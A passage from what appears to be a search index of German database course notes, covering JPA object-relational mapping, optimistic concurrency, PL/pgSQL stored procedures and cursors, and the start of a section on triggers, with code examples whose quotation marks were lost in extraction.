changes\n\n\n// ...\n\n\nem\n.\ngetTransaction\n().\ncommit\n();\n \n// or rollback()\n\n\n\n\n\n\n\n\nIsolation Level ist per default Read-Commited\n\n\nNur Daten lesen, die eine andere Transaktion commited hat\n\n\n\n\n\n\n\n\nOptimistic Concurrency\n\n\n\n\nBeim Commit einer Transaktion wird nach Konflikten gepr\u00fcft\n\n\nWenn Konflikt entstand, wird ein Rollback gemacht\n\n\n\n\nVersions-Feld\n\n\n\n\nMit jedem Update Feld hochz\u00e4hlen\n\n\nBeim Schreiben pr\u00fcfen, ob das Feld gleich ist wie der Wert, der vorher gelesen wurde\n\n\nWenn Feld anders, hat jemand in der Zwischenzeit den Record ver\u00e4ndert -\n Rollback\n\n\n\n\nUPDATE\n \nUser\n \nSET\n \n...,\n \nversion\n \n=\n \nversion\n \n+\n \n1\n\n\nWHERE\n \nid\n \n=\n \n?\n \nAND\n \nversion\n \n=\n \nreadVersion\n\n\n\n\n\n\n\n\nJPA wirft bei Verletzung eine \nConcurrencyLockException\n\n\n\n\nEntity Locking\n\n\n\n\nem.lock()\n\n\nOPTIMISTIC_FORCE_INCREMENT: Beim lock direkt direkt das Versions-Feld erh\u00f6hen, damit andere keine Commits mehr darauf machen kann, der vorher gelesen hat\n\n\n\n\nDetached Entities\n\n\n\n\nOft m\u00f6chte man DB-Objekte \"detachen\" (Db-Context schliessen), ver\u00e4ndern, und dann wieder in die DB schreiben\n\n\nMit \nentityManger.merge(object)\n wird ein wieder in den Persistenz-Kontext geladen, dass wieder commited werden kann\n\n\n\n\nInheritance Mapping\n\n\nSingle Table Mapping (Table per Hierarchy)\n\n\n@Entity\n\n\n@Inheritance\n(\nstrategy\n \n=\n \nInheritanceType\n.\nSINGLE_TABLE\n)\n\n\n@DiscriminatorColumn\n(\nname\n \n=\n \ntype\n)\n\n\npublic\n \nabstract\n \nclass\n \nBankCustomer\n \n{\n\n    \n@Id\n \nprivate\n \nString\n \nname\n;\n\n\n}\n\n\n\n@Entity\n\n\n@DiscriminatorValue\n(\nRetail\n)\n\n\npublic\n \nclass\n \nRetailBankCustomer\n \nextends\n \nBankCustomer\n \n{\n\n    \nprivate\n \nint\n \nfees\n;\n\n\n}\n\n\n@Entity\n\n\n@DiscriminatorValue\n(\nPrivate\n)\n\n\npublic\n \nclass\n \nPrivateBankCustomer\n \nextends\n \nBankCustomer\n \n{\n\n    \nprivate\n \nString\n \neliteOffer\n;\n\n\n}\n\n\n\n\n\n\n\n\nDas Feld \"type\" ist hier diskriminator und wird in der DB verwendet, um die verschiedenen \nBankCustomer\n zu unterscheiden\n\n\n\n\nJoined Table Mapping\n\n\nTable per Class Mapping\n\n\nAbfragen mit JPQL\n\n\n\n\nSprache analog zu SQL...\n\n\n, aber operiert auf Entity Model, nicht DB-Model!\n\n\nEs k\u00f6nnen z.B. \"Navigation Attributes\" verwendet werden\n\n\n\"Prepared Statements\" mit Named Parameters\n\n\n\n\nQuery\n \nquery\n \n=\n \nem\n.\ncreateQuery\n(\n\n    \nSELECT c FROM BankCustomer c WHERE c.name LIKE :customerName\n\n\n);\n\n\nquery\n.\nsetParameter\n(\ncustomerName\n,\n \nname\n);\n\n\nquery\n.\nsetMaxResults\n(\n1000\n);\n\n\nList\nBankCustomer\n \nlist\n \n=\n \nquery\n.\ngetResultList\n();\n\n\n\n\n\n\nNamed Queries\n\n\nCriteria API", 
            "title": "2 OR Mapping"
        }, 
        {
            "location": "/Dbs2/2_OR-Mapping/#or-mapping", 
            "text": "Ziel: Gap zwischen Objektmodell der Applikation und (meist) relationales Modell der Datenbanken \u00fcberwinden", 
            "title": "OR Mapping"
        }, 
        {
            "location": "/Dbs2/2_OR-Mapping/#java-persistence-api-jpa", 
            "text": "JPA ist ein Layer zwischen JDBC und dem Programm  JPA ist nur eine Definition, implementiert von Providern  Hier wird die EclipseLink-Implementierung verwendet (Hibernate w\u00e4re ein anderer Provider)", 
            "title": "Java Persistence API (JPA)"
        }, 
        {
            "location": "/Dbs2/2_OR-Mapping/#entities", 
            "text": "Entities sind POJO's mit ID-Feld f\u00fcr PK mit default-Konstruktor  D\u00fcrfen nicht final sein (wegen z.B. lazy-loading)  Abbildung in DB \u00fcber Annotations oder sepparates XML-File  Annotation  @Entity  f\u00fcr Klasse,  @Id  f\u00fcr PK-Feld", 
            "title": "Entities"
        }, 
        {
            "location": "/Dbs2/2_OR-Mapping/#beispiel", 
            "text": "@Entity  public   class   BankCustomer   { \n     @Id \n     private   long   id ; \n\n     public   long   getId ()   { \n         return   id ; \n     } \n     private   String   name ; \n     public   String   getName ()   { \n         return   name ; \n     } \n     public   void   setName ( String   name )   { \n         this . name   =   name ; \n     }  }", 
            "title": "Beispiel"
        }, 
        {
            "location": "/Dbs2/2_OR-Mapping/#persistencexml", 
            "text": "persistence   xmlns:xsi= http://www.w3.org/2001/XMLSchema-instance \n     xsi:schemaLocation= http://java.sun.com/xml/ns/persistence          http://java.sun.com/xml/ns/persistence/persistence_2_0.xsd \n     version= 2.0   xmlns= http://java.sun.com/xml/ns/persistence  persistence-unit   name= Bank   transaction-type= RESOURCE_LOCAL \n     provider org.eclipse.persistence.jpa.PersistenceProvider /provider \n     exclude-unlisted-classes false /exclude-unlisted-classes \n         properties \n             property   name= javax.persistence.jdbc.driver \n                 value= org.postgresql.Driver / \n             property   name= javax.persistence.jdbc.url \n                 value= jdbc:postgresql:jpatest / \n             property   name= javax.persistence.jdbc.user   value= test / \n             property   name= javax.persistence.jdbc.password   value= test / \n             property   name= eclipselink.target-database   value= PostgreSQL / \n         /properties \n     /persistence-unit  /persistence", 
            "title": "persistence.xml"
        }, 
        {
            "location": "/Dbs2/2_OR-Mapping/#entities-crud", 
            "text": "// SELECT  EntityManagerFactory   factory   = \n     Persistence . createEntityManagerFactory ( Bank );  EntityManager   em   =   factory . createEntityManager ();  Query   query   =   em . createQuery ( SELECT a FROM BankAccount a );  List BankAccount   list   =   query . getResultList ();  for   ( BankAccount   account   :   list )   { \n     System . out . println ( account );  }  em . close ();   // besser mit try-with-ressources  // INSERT  em . getTransaction (). begin ();  BankCustomer   customer   =   new   BankCustomer ();  customer . setName ( Bill );  em . persist ( customer );   // INSERT and SELECT, customer hat jetzt seine ID  em . getTransaction (). commit ();  em . close ();  // UPDATE  em . getTransaction (). begin ();  BankAccount   account   =   em . find ( BankAccount . class ,   1L );  account . incBalance ( 100 );  em . getTransaction (). commit ();  // DELETE  // nicht effizient, Java-Object wird erst durch GC aufger\u00e4umt  em . getTransaction (). begin ();  BankAccount   account   =   em . find ( BankAccount . class ,   1L );  em . remove ( account );  em . getTransaction (). commit ();", 
            "title": "Entities CRUD"
        }, 
        {
            "location": "/Dbs2/2_OR-Mapping/#table-mapping", 
            "text": "@Entity  @Table ( name   =   account )  public   class   BankAccount   { \n     @Id \n     @Column ( name   =   accountid ) \n     private   long   id ; \n\n     private   double   balance ;   // 1:1 Mapping \n\n     @Column ( name   =   description ) \n     private   String   explanation ; \n\n     @Column ( name = \u201c ssn \u201c ,   unique = true ,   nullable = true ) \n     private   long   ssn ; \n\n     @Column ( name = \u201c l_name \u201c ,   length = 200 ) \n     private   String   lastName ; \n\n     //Zusatzinfo, wird als TIMESTAMP abgelegt \n     @Temporal ( TemporalType . TIMESTAMP )  \n     private   Calendar   creationDate ; \n\n     @Transient   // wird nicht gemapped \n     private   String   tempComments ; \n     // getter und setter  }    Weitere Attribute:  scale ,  precision", 
            "title": "Table Mapping"
        }, 
        {
            "location": "/Dbs2/2_OR-Mapping/#relationen", 
            "text": "// 1:1 Mapping  @Entity  @Table ( name   =   bankcustomer )  public   class   BankCustomer   { \n     @OneToOne ( optional   =   true ) \n     @JoinColumn ( name   =   addressref ) \n     private   Address   address ; \n     // ...  }  // Bidirectional 1:1 mapping, Datenbank bleibt gleich  @Entity  public   class   Address   { \n     @OneToOne ( mappedBy   =   address ) \n     private   BankCustomer   customer ; \n     // ...  }  // N:1 Mapping  class   BankAccount   { \n     @ManyToOne ( optional   =   false ) \n     @JoinColumn ( name   =   customerref ) \n     private   BankCustomer   customer ; \n     //...  }  // Bidirectional N:1   class   BankCustomer   { \n     @OneToMany ( mappedBy   =   customer ) \n     private   Collection BankAccount   accounts ;   // = ... \n     // ...  }  // N:M maping  class   BankManager   { \n     @ManyToMany \n     @JoinTable ( name   =   customer_manager , \n         joinColumns   =   { @JoinColumn ( name   =   managerref )}, \n         inverseJoinColumns   =   { @JoinColumn ( name   =   customerref )}) \n     private   Collection BankCustomer   customers ;   // = ...  }    Bei bidirektionalen Beziehungen m\u00fcssen beide Seiten manuell gesetzt werden (im Gegensatz zu z.B. EF)  Im Beispiel muss beim Hinzuf\u00fcgen eines  BankAccount  dieser der Liste in der  BankCustomer  hinzugef\u00fcgt werden    Lazy-Loading ist per default aktiviert f\u00fcr 1:n und n:m  Bsp: Wenn  BankCustomer  geladen werden, wird die  BankAccounts -Liste lazy mit  customer.getAccounts()  geladen    Eager-Loading standard bei 1:1 und n:1  Explizit angeben mit z.B.  @ManyToMany(fetch = FetchType.EAGER)", 
            "title": "Relationen"
        }, 
        {
            "location": "/Dbs2/2_OR-Mapping/#persistence-context", 
            "text": "Ein Objekt ist neu erstellt erstmal  unmanaged  Wird es in die DB eingef\u00fcgt mit  persist() , ist es  managed  und somit im Persistence-Context (Objekt hat eine Id)  Wird die Verbindung geschlossen ( close() ) oder removed, sind die Objekte wieder  unmanaged  Persistence-Kontext verwaltet einen Cache - Bei mehrmaliger Abfrage der gleichen Objekte werden sie aus dem Cache geladen  Wichtig, sonst k\u00f6nnte es mehrere Java-Instanzen f\u00fcr ein DB-Objekt geben   So gibt es in einem Kontext f\u00fcr ein DB-Objekt genau eine Java Instanz  (Identity Map Pattern)      Ge\u00e4nderte Werte im Persistence-Kontext werden beim Transaction-Commit auf der DB gespeichert (Unit of Work Pattern)   EntityManager   em   =   emf . createEntityManager ();  BankCustomer   c1   =   em . find ( BankCustomer . class ,   1L );  BankCustomer   c2   =   em . find ( BankCustomer . class ,   1L );  assert ( c1   ==   c2 );   // gleicher PC  EntityManager   em1   =   emf . createEntityManager ();  c2   =   em1 . find ( BankCustomer . class ,   1L );  assert ( c1   !=   c2 );   // unterschiedlicher PC", 
            "title": "Persistence-Context"
        }, 
        {
            "location": "/Dbs2/2_OR-Mapping/#entity-identitat", 
            "text": "Annotation  @Id  @GeneratedValue  - generierte ID mit 4 M\u00f6glichkeiten", 
            "title": "Entity Identit\u00e4t"
        }, 
        {
            "location": "/Dbs2/2_OR-Mapping/#typ-identity", 
            "text": "@Id  @GeneratedValue ( strategy   =   GenerationType . IDENTITY )  private   long   accountId ;    Wird abgebildet in  SERIAL", 
            "title": "Typ Identity"
        }, 
        {
            "location": "/Dbs2/2_OR-Mapping/#typ-sequence", 
            "text": "Id  @GeneratedValue ( strategy   =   GenerationType . SEQUENCE , \n     generator   =   BankCustGen )  @SequenceGenerator ( name   =   BankCustGen , \n     sequenceName   =   CustomerIdSeq , \n     allocationSize = 1 )  private   long   customerId ;    Note  todo", 
            "title": "Typ Sequence"
        }, 
        {
            "location": "/Dbs2/2_OR-Mapping/#transitive-persistenz", 
            "text": "Von Persistente Objekte erreichbaren Objekte sollten auch persistent sein", 
            "title": "Transitive Persistenz"
        }, 
        {
            "location": "/Dbs2/2_OR-Mapping/#inkonsistente-bidirektionalitat", 
            "text": "In JPA werden bidirektionale Relationen nicht in beide Richtungen automatisch gesetzt  Muss von Hand gemacht werden", 
            "title": "Inkonsistente Bidirektionalit\u00e4t"
        }, 
        {
            "location": "/Dbs2/2_OR-Mapping/#transaktionen", 
            "text": "EntityManager   em   =   factory . createEntityManager ();  em . getTransaction (). begin ();  // ...  // do something... make changes  // ...  em . getTransaction (). commit ();   // or rollback()    Isolation Level ist per default Read-Commited  Nur Daten lesen, die eine andere Transaktion commited hat", 
            "title": "Transaktionen"
        }, 
        {
            "location": "/Dbs2/2_OR-Mapping/#optimistic-concurrency", 
            "text": "Beim Commit einer Transaktion wird nach Konflikten gepr\u00fcft  Wenn Konflikt entstand, wird ein Rollback gemacht", 
            "title": "Optimistic Concurrency"
        }, 
        {
            "location": "/Dbs2/2_OR-Mapping/#versions-feld", 
            "text": "Mit jedem Update Feld hochz\u00e4hlen  Beim Schreiben pr\u00fcfen, ob das Feld gleich ist wie der Wert, der vorher gelesen wurde  Wenn Feld anders, hat jemand in der Zwischenzeit den Record ver\u00e4ndert -  Rollback   UPDATE   User   SET   ...,   version   =   version   +   1  WHERE   id   =   ?   AND   version   =   readVersion    JPA wirft bei Verletzung eine  ConcurrencyLockException", 
            "title": "Versions-Feld"
        }, 
        {
            "location": "/Dbs2/2_OR-Mapping/#entity-locking", 
            "text": "em.lock()  OPTIMISTIC_FORCE_INCREMENT: Beim lock direkt direkt das Versions-Feld erh\u00f6hen, damit andere keine Commits mehr darauf machen kann, der vorher gelesen hat", 
            "title": "Entity Locking"
        }, 
        {
            "location": "/Dbs2/2_OR-Mapping/#detached-entities", 
            "text": "Oft m\u00f6chte man DB-Objekte \"detachen\" (Db-Context schliessen), ver\u00e4ndern, und dann wieder in die DB schreiben  Mit  entityManger.merge(object)  wird ein wieder in den Persistenz-Kontext geladen, dass wieder commited werden kann", 
            "title": "Detached Entities"
        }, 
        {
            "location": "/Dbs2/2_OR-Mapping/#inheritance-mapping", 
            "text": "", 
            "title": "Inheritance Mapping"
        }, 
        {
            "location": "/Dbs2/2_OR-Mapping/#single-table-mapping-table-per-hierarchy", 
            "text": "@Entity  @Inheritance ( strategy   =   InheritanceType . SINGLE_TABLE )  @DiscriminatorColumn ( name   =   type )  public   abstract   class   BankCustomer   { \n     @Id   private   String   name ;  }  @Entity  @DiscriminatorValue ( Retail )  public   class   RetailBankCustomer   extends   BankCustomer   { \n     private   int   fees ;  }  @Entity  @DiscriminatorValue ( Private )  public   class   PrivateBankCustomer   extends   BankCustomer   { \n     private   String   eliteOffer ;  }    Das Feld \"type\" ist hier diskriminator und wird in der DB verwendet, um die verschiedenen  BankCustomer  zu unterscheiden", 
            "title": "Single Table Mapping (Table per Hierarchy)"
        }, 
        {
            "location": "/Dbs2/2_OR-Mapping/#joined-table-mapping", 
            "text": "", 
            "title": "Joined Table Mapping"
        }, 
        {
            "location": "/Dbs2/2_OR-Mapping/#table-per-class-mapping", 
            "text": "", 
            "title": "Table per Class Mapping"
        }, 
        {
            "location": "/Dbs2/2_OR-Mapping/#abfragen-mit-jpql", 
            "text": "Sprache analog zu SQL...  , aber operiert auf Entity Model, nicht DB-Model!  Es k\u00f6nnen z.B. \"Navigation Attributes\" verwendet werden  \"Prepared Statements\" mit Named Parameters   Query   query   =   em . createQuery ( \n     SELECT c FROM BankCustomer c WHERE c.name LIKE :customerName  );  query . setParameter ( customerName ,   name );  query . setMaxResults ( 1000 );  List BankCustomer   list   =   query . getResultList ();", 
            "title": "Abfragen mit JPQL"
        }, 
        {
            "location": "/Dbs2/2_OR-Mapping/#named-queries", 
            "text": "", 
            "title": "Named Queries"
        }, 
        {
            "location": "/Dbs2/2_OR-Mapping/#criteria-api", 
            "text": "", 
            "title": "Criteria API"
        }, 
        {
            "location": "/Dbs2/3_Stored_Procedures/", 
            "text": "Stored Procedures / pgSQL\n\n\nStored Procedures\n\n\n\n\nFunktionen, die auf dem DBMS \"nahe den Daten\" ausgef\u00fchrt werden\n\n\nK\u00f6nnen wiederum von anderen SP, Trigger oder PL/SQL ausgef\u00fchrt werden\n\n\nSind Datenbankobjekte\n\n\nHaben eigenes Recht zur Ausf\u00fchrung\n\n\nPL: Prozedurale Sprache f\u00fcr Datenbanken\n\n\n\n\nCREATE\n \nOR\n \nREPLACE\n \nFUNCTION\n \nincrement\n(\ni\n \nINT\n)\n\n\nRETURNS\n \nINT\n \nAS\n \n$$\n\n\nBEGIN\n\n\nRETURN\n \ni\n \n+\n \n1\n;\n\n\nEND\n;\n\n\n$$\n \nLANGUAGE\n \nplpgsql\n;\n\n\n\n-- use\n\n\nSELECT\n \nincrement\n(\n10\n);\n \n-- 11\n\n\n\n\n\n\n\n\nVariablen deklarieren in \nDECLARE\n Block\n\n\nGefolgt von Logik zwischen \nBEGIN\n und \nEND\n\n\nSQL kann direkt eingebettet werden\n\n\nIF: \nIF expression THEN statements ELSIF cond THEN ... END IF;\n\n\nExceptions:\n\n\n\n\nEXCEPTION\n\n\nWHEN\n \ntype\n \nTHEN\n \nstatement\n;\n\n\nWHEN\n \nother_type\n \nTHEN\n \nstatement\n;\n\n\n\n\n\n\nSelect .. Into\n\n\nDECLARE\n\n    \nAngNr\n \nAngestellter\n.\nPersNr\n%\nTYPE\n;\n\n    \n-- Typ von Angestellter.PersNr\n\n\nBEGIN\n \n/*lokaler, anonymer Block */\n\n    \nSELECT\n \nAngestellter\n.\nPersNr\n \nINTO\n \nSTRICT\n \nAngNr\n\n    \nFROM\n \nAngestellter\n\n    \nWHERE\n \nAngestellter\n.\nName\n \n=\n \nMarxer, Markus\n;\n\n\nEND\n\n\n\n\n\n\nInsert ... into\n\n\nDECLARE\n\n    \nPNr\n \nProjekt\n.\nProjNr\n%\nTYPE\n;\n\n    \nAngNr\n \nAngestellter\n.\nPersNr\n%\nTYPE\n;\n\n    \nProzAnt\n \nDECIMAL\n;\n\n\nBEGIN\n\n\n--....\n\n    \nINSERT\n \nINTO\n \nProjektZuteilung\n\n    \nVALUES\n \n(\nAngNr\n,\n \nPNr\n,\n \nProzAnt\n,\n \nNULL\n,\n \nNULL\n);\n\n\nEXCEPTION\n\n    \nWHEN\n \nunique_violation\n \nTHEN\n\n    \n/*Projektzuteilung existiert bereits*/\n\n\nEND\n;\n\n\n\n\n\n\n\n\nFOUND\n wird \ntrue\n, wenn Row gefunden wurde\n\n\nIn PostgreSQL Terminologie\n\n\n\"Stored Procedure\" = \"Function\" mit Returnwert void\n\n\n\n\n\n\n\n\nReturn Table\n\n\nCREATE\n \nOR\n \nREPLACE\n \nFUNCTION\n \nget_AbtMA\n \n(\nnr\n \ninteger\n)\n\n    \nRETURNS\n \nTABLE\n \n(\n\n        \nabtname\n \nVARCHAR\n,\n\n        \nabtMA\n \nVARCHAR\n\n    \n)\n\n\nAS\n \n$$\n\n\nBEGIN\n\n    \nRETURN\n \nQUERY\n\n    \nSELECT\n \nabt\n.\nname\n,\n \nang\n.\nname\n \nFROM\n \nabteilung\n \nabt\n\n    \njoin\n \nangestellter\n \nang\n \non\n \nang\n.\nabtnr\n=\nabt\n.\nabtnr\n\n    \nwhere\n \nabt\n.\nabtnr\n=\nnr\n\n    \norder\n \nby\n \nabt\n.\nname\n,\n \nang\n.\nname\n;\n\n\nEND\n;\n\n\n$$\n \nLANGUAGE\n \nplpgsql\n;\n\n\n\n\n\n\nReturn a Set\n\n\n\n\nReturn a set of rows\n\n\n\n\nCREATE\n \nOR\n \nREPLACE\n \nFUNCTION\n \ngetAllFoo\n()\n\n\nRETURNS\n \nSETOF\n \nfoo\n \nAS\n \n$$\n\n\nDECLARE\n\n    \nr\n \nfoo\n%\nrowtype\n;\n \n-- foo ist tabelle\n\n\nBEGIN\n\n    \nFOR\n \nr\n \nIN\n \nSELECT\n \n*\n \nFROM\n \nfoo\n \nWHERE\n \nfooid\n \n \n0\n\n    \nLOOP\n\n        \n-- do something...\n\n        \nRETURN\n \nNEXT\n \nr\n;\n \n-- return current row of SELECT\n\n    \nEND\n \nLOOP\n;\n\n    \nRETURN\n;\n\n\nEND\n\n\n$$\n \nLANGUAGE\n \nplpgsql\n;\n\n\n\n\n\n\nCursor\n\n\n\n\nEin Cursor zeigt auf ein Tupel in einem ResultSet\n\n\n\n\n\n\nCursor deklarieren in \nDECLARE\n\n\n\n\nAngCursor\n \n(\nabtNr\n \ninteger\n)\n \nCURSOR\n \nFOR\n\n    \nSELECT\n \nSalaer\n,\n \nPersNr\n \nFROM\n \nAngestellter\n\n    \nWHERE\n \nAngestellter\n.\nAbtNr\n \n=\n \nabtNr\n;\n\n\n\n\n\n\n\n\nCursor \u00f6ffnen: \nOPEN AngCursor(2)\n\n\nFetch records\n\n\n\n\nLOOP\n \n/*Iteration ueber Resulatmenge*/\n\n    \nFETCH\n \nAngCursor\n \nINTO\n \nAngSalaer\n,\n \nAngPersNr\n;\n\n    \nEXIT\n \nWHEN\n \nNOT\n \nFOUND\n\n    \nSalSumme\n \n:\n=\n \nSalSumme\n \n+\n \nAngSalaer\n;\n\n    \nRAISE\n \nnotice\n \nAngstellter PersNr: % Salaer %\n,\n\n    \nAngPersNr\n,\n \nAngSalaer\n;\n\n\nEND\n \nLOOP\n;\n\n\n\n\n\n\n\n\nCursor schliessen: \nCLOSE AngCursor\n\n\n\n\nCursor f\u00fcr UPDATE\n\n\nAngCursor\n \nCURSOR\n \nFOR\n\n    \nSELECT\n \nSalaer\n,\n \nChef\n,\n \nPersNr\n \nFROM\n \nAngestellter\n\n    \nWHERE\n \nAngestellter\n.\nAbtNr\n=\nCurrAbtNr\n\n    \nFOR\n \nUPDATE\n;\n\n\nOPEN\n \nAngCursor\n;\n\n\nLOOP\n\n    \nFETCH\n \nAngCursor\n \nINTO\n \nAngRec\n;\n\n    \nEXIT\n \nWHEN\n \nNOT\n \nFOUND\n;\n\n    \nUPDATE\n \nAngestellter\n \nSET\n \nSalaer\n \n=\n \nMinSalaer\n\n    \nWHERE\n \nCURRENT\n \nOF\n \nAngCursor\n;\n \n-- \n---\n\n\nEND\n \nLOOP\n;\n\n\nCLOSE\n \nAngCursor\n;", 
            "title": "3 Stored Procedures"
        }, 
        {
            "location": "/Dbs2/3_Stored_Procedures/#stored-procedures-pgsql", 
            "text": "", 
            "title": "Stored Procedures / pgSQL"
        }, 
        {
            "location": "/Dbs2/3_Stored_Procedures/#stored-procedures", 
            "text": "Funktionen, die auf dem DBMS \"nahe den Daten\" ausgef\u00fchrt werden  K\u00f6nnen wiederum von anderen SP, Trigger oder PL/SQL ausgef\u00fchrt werden  Sind Datenbankobjekte  Haben eigenes Recht zur Ausf\u00fchrung  PL: Prozedurale Sprache f\u00fcr Datenbanken   CREATE   OR   REPLACE   FUNCTION   increment ( i   INT )  RETURNS   INT   AS   $$  BEGIN  RETURN   i   +   1 ;  END ;  $$   LANGUAGE   plpgsql ;  -- use  SELECT   increment ( 10 );   -- 11    Variablen deklarieren in  DECLARE  Block  Gefolgt von Logik zwischen  BEGIN  und  END  SQL kann direkt eingebettet werden  IF:  IF expression THEN statements ELSIF cond THEN ... END IF;  Exceptions:   EXCEPTION  WHEN   type   THEN   statement ;  WHEN   other_type   THEN   statement ;", 
            "title": "Stored Procedures"
        }, 
        {
            "location": "/Dbs2/3_Stored_Procedures/#select-into", 
            "text": "DECLARE \n     AngNr   Angestellter . PersNr % TYPE ; \n     -- Typ von Angestellter.PersNr  BEGIN   /*lokaler, anonymer Block */ \n     SELECT   Angestellter . PersNr   INTO   STRICT   AngNr \n     FROM   Angestellter \n     WHERE   Angestellter . Name   =   Marxer, Markus ;  END", 
            "title": "Select .. Into"
        }, 
        {
            "location": "/Dbs2/3_Stored_Procedures/#insert-into", 
            "text": "DECLARE \n     PNr   Projekt . ProjNr % TYPE ; \n     AngNr   Angestellter . PersNr % TYPE ; \n     ProzAnt   DECIMAL ;  BEGIN  --.... \n     INSERT   INTO   ProjektZuteilung \n     VALUES   ( AngNr ,   PNr ,   ProzAnt ,   NULL ,   NULL );  EXCEPTION \n     WHEN   unique_violation   THEN \n     /*Projektzuteilung existiert bereits*/  END ;    FOUND  wird  true , wenn Row gefunden wurde  In PostgreSQL Terminologie  \"Stored Procedure\" = \"Function\" mit Returnwert void", 
            "title": "Insert ... into"
        }, 
        {
            "location": "/Dbs2/3_Stored_Procedures/#return-table", 
            "text": "CREATE   OR   REPLACE   FUNCTION   get_AbtMA   ( nr   integer ) \n     RETURNS   TABLE   ( \n         abtname   VARCHAR , \n         abtMA   VARCHAR \n     )  AS   $$  BEGIN \n     RETURN   QUERY \n     SELECT   abt . name ,   ang . name   FROM   abteilung   abt \n     join   angestellter   ang   on   ang . abtnr = abt . abtnr \n     where   abt . abtnr = nr \n     order   by   abt . name ,   ang . name ;  END ;  $$   LANGUAGE   plpgsql ;", 
            "title": "Return Table"
        }, 
        {
            "location": "/Dbs2/3_Stored_Procedures/#return-a-set", 
            "text": "Return a set of rows   CREATE   OR   REPLACE   FUNCTION   getAllFoo ()  RETURNS   SETOF   foo   AS   $$  DECLARE \n     r   foo % rowtype ;   -- foo ist tabelle  BEGIN \n     FOR   r   IN   SELECT   *   FROM   foo   WHERE   fooid     0 \n     LOOP \n         -- do something... \n         RETURN   NEXT   r ;   -- return current row of SELECT \n     END   LOOP ; \n     RETURN ;  END  $$   LANGUAGE   plpgsql ;", 
            "title": "Return a Set"
        }, 
        {
            "location": "/Dbs2/3_Stored_Procedures/#cursor", 
            "text": "Ein Cursor zeigt auf ein Tupel in einem ResultSet    Cursor deklarieren in  DECLARE   AngCursor   ( abtNr   integer )   CURSOR   FOR \n     SELECT   Salaer ,   PersNr   FROM   Angestellter \n     WHERE   Angestellter . AbtNr   =   abtNr ;    Cursor \u00f6ffnen:  OPEN AngCursor(2)  Fetch records   LOOP   /*Iteration ueber Resulatmenge*/ \n     FETCH   AngCursor   INTO   AngSalaer ,   AngPersNr ; \n     EXIT   WHEN   NOT   FOUND \n     SalSumme   : =   SalSumme   +   AngSalaer ; \n     RAISE   notice   Angstellter PersNr: % Salaer % , \n     AngPersNr ,   AngSalaer ;  END   LOOP ;    Cursor schliessen:  CLOSE AngCursor", 
            "title": "Cursor"
        }, 
        {
            "location": "/Dbs2/3_Stored_Procedures/#cursor-fur-update", 
            "text": "AngCursor   CURSOR   FOR \n     SELECT   Salaer ,   Chef ,   PersNr   FROM   Angestellter \n     WHERE   Angestellter . AbtNr = CurrAbtNr \n     FOR   UPDATE ;  OPEN   AngCursor ;  LOOP \n     FETCH   AngCursor   INTO   AngRec ; \n     EXIT   WHEN   NOT   FOUND ; \n     UPDATE   Angestellter   SET   Salaer   =   MinSalaer \n     WHERE   CURRENT   OF   AngCursor ;   --  ---  END   LOOP ;  CLOSE   AngCursor ;", 
            "title": "Cursor f\u00fcr UPDATE"
        }, 
        {
            "location": "/Dbs2/4_Triggers/", 
            "text": "Triggers\n\n\nAnwedungen\n\n\n\n\nBerechnen von komplexen Konsistenzbedingungen\n\n\nSicherheiten, z.B. das \u00c4nderungen an Tabelle X nur an Wochentagen ausgef\u00fchrt werden k\u00f6nnen\n\n\nSammeln von Statistik und Log-Daten\n\n\nBerechnen von abgeleiteten Attributen\n\n\n\n\nEigenschaften\n\n\n\n\nSind DB-Objekte und immer einer Tabelle zugeordnet\n\n\nWerden in Stored Procedures programmiert\n\n\nSind parameterlos\n\n\nWerden beim Eintreten eines Events vom DBMS ausgef\u00fchrt, nicht manuell\n\n\n\n\nAusf\u00fchrung\n\n\n\n\n\"Before\" Triggers k\u00f6nnen \u00c4nderungen an einer Row vornehmen\n\n\n\"After\" Triggers k\u00f6nnen nur reagieren, der Returnwert wird ignoriert\n\n\nTriggers werden in alphabetischer Reihenfolge ausgef\u00fchrt\n\n\nWenn \"Before\"-Trigger als R\u00fcckgabewert NULL liefert, wird die Operation abgebrochen!\n\n\n\n\nSyntax\n\n\n\n\nAllgemein (Beispiel)\n\n\n\n\nCREATE\n \n|\n \nALTER\n \nTRIGGER\n \nname\n \nBEFORE\n \n|\n \nAFTER\n \nINSERT\n \n[\nOR\n \nUPDATE\n \n[\nOF\n \nattribute\n]\n \n[\nOR\n \n...]]\n\n\nON\n \ntable\n\n\nFOR\n \nEACH\n \nROW\n \n|\n \nSTATEMENT\n\n\nEXECUTE\n \nPROCEDURE\n \nmytriggerfunc\n();\n\n\n\n\n\n\n\n\nTrigger-Funktion (Procedure)\n\n\n\n\nCREATE\n \nFUNCTION\n \nmytrigger_func\n()\n\n\nRETURNS\n \nTRIGGER\n \n-- special meaning\n\n\nAS\n \n$$\n\n\nbody\n\n\n$$\n \nlanguage\n \nplpgsql\n;\n\n\n\n\n\n\n\n\nDie Eigenschaften eines Triggers, z.B. ob \nBEFORE\n oder \nAFTER\n, auf welche Operation getriggert wird, Name der Tabelle, etc. wird in Variablen der Funktion \u00fcbergeben, alle mit dem Prefix \nTG_\n\n\nMit der Variable \nNEW\n kann eine neue, leere Row gef\u00fcllt werden (nur bei INSERT UND UPDATE)\n\n\nMit der \nOLD\n-Variable wird die \"alte\" Row angesprochen (nur bei UPDATE und DELETE)\n\n\n\n\nBeispiele\n\n\nCREATE\n \nOR\n \nREPLACE\n \nFUNCTION\n \ndt_trigger_func\n()\n\n\nRETURNS\n \nTRIGGER\n \nAS\n \n$$\n\n\nBEGIN\n\n    \nIF\n \n(\nTG_OP\n \n=\n \nINSERT\n)\n \nTHEN\n\n        \nNEW\n.\ncreation_date\n \n:\n=\n \nnow\n();\n\n    \nELSIF\n \n(\nTG_OP\n \n=\n \nUPDATE\n)\n \nTHEN\n\n        \nNEW\n.\nmodification_date\n \n:\n=\n \nnow\n();\n\n    \nEND\n \nIF\n;\n\n    \nRETURN\n \nNEW\n;\n\n\nEND\n\n\n$$\n \nLANGUAGE\n \nplpgsql\n;\n\n\n\n\n\n\nBefore Delete\n\n\nCREATE\n \nOR\n \nREPLACE\n \nFUNCTION\n \ndelete_tbl_trigger_fn\n()\n\n\nRETURNS\n \ntrigger\n \nAS\n \n$$\n\n\nBEGIN\n\n    \nUPDATE\n \ntbl\n \nSET\n \ndeleted\n=\ntrue\n \nWHERE\n \nid\n=\nOLD\n.\nid\n;\n\n    \nRETURN\n \nNULL\n;\n \n-- Note RETURN NULL, not RETURN OLD!\n\n\nEND\n;\n\n\n$$\n \nLANGUAGE\n \nplpgsql\n;\n\n\n\nCREATE\n \nTRIGGER\n 